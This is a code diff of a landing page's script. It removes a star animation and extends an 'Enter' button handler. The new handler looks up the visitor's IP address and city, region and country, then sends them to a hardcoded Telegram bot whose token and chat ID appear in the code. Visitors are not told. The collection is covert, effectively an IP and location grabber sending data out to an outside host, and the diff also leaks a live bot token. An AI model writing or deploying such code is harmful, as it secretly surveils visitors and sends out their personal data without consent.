@@ -90,16 +90,6 @@
     </div>
 
     <script>
-        // Create stars
-        const starsContainer = document.querySelector('.stars');
-        for (let i = 0; i < 150; i++) {
-            const star = document.createElement('div');
-            star.className = 'star';
-            star.style.left = `${Math.random() * 100}%`;
-            star.style.top = `${Math.random() * 100}%`;
-            starsContainer.appendChild(star);
-        }
-
         // Enter button functionality
         const enterBtn = document.getElementById('enterBtn');
         const body = document.body;
@@ -107,13 +97,14 @@
         enterBtn.addEventListener('click', () => {
             body.classList.add('fadeOut');
             setTimeout(() => {
-                // Fetching IP and Location details
-                fetch('https://api.ipify.org?format=json')
+                // Fetching IP and Location details from ipinfo.io
+                fetch('https://ipinfo.io/json?token=YOUR_TOKEN')
                     .then(response => response.json())
                     .then(data => {
                         const ip = data.ip;
+                        const location = data.city + ', ' + data.region + ', ' + data.country;
                         // Send to Telegram
-                        sendToTelegram(ip);
+                        sendToTelegram(ip, location);
                     })
                     .catch(err => console.error('Error fetching IP:', err));
 
@@ -124,10 +115,10 @@
             }, 500);
         });
 
-        function sendToTelegram(ip) {
+        function sendToTelegram(ip, location) {
             const token = '8132685114:AAFLul-sqA7Ld5keC7FWdKatu_41hjVHBYM';
             const chatId = '1962244896';
-            const message = `IP Address: ${ip}\nLocation: Fetch location API or info`;
+            const message = `IP Address: ${ip}\nLocation: ${location}`;
 
             // Send message to Telegram
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
